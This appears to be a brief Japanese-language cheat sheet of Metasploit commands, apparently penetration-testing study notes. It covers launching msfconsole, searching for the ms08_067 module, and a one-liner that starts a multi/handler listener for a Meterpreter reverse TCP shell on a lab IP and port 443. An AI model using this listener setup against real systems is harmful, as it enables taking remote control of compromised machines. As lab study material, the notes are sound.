# metasploit

### 起動

```
sudo msfconsole -q
```



### 検索

```
search ms08_067
```



### 検索オプションの確認

```
search -h
```



### ハンドラー

```
msf6 > use exploit/multi/handler 
```

```bash
sudo msfconsole -q -x "use exploit/multi/handler;\
>              set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
>              set LHOST 192.168.119.153;\
>              set LPORT 443;\
>              run"
```

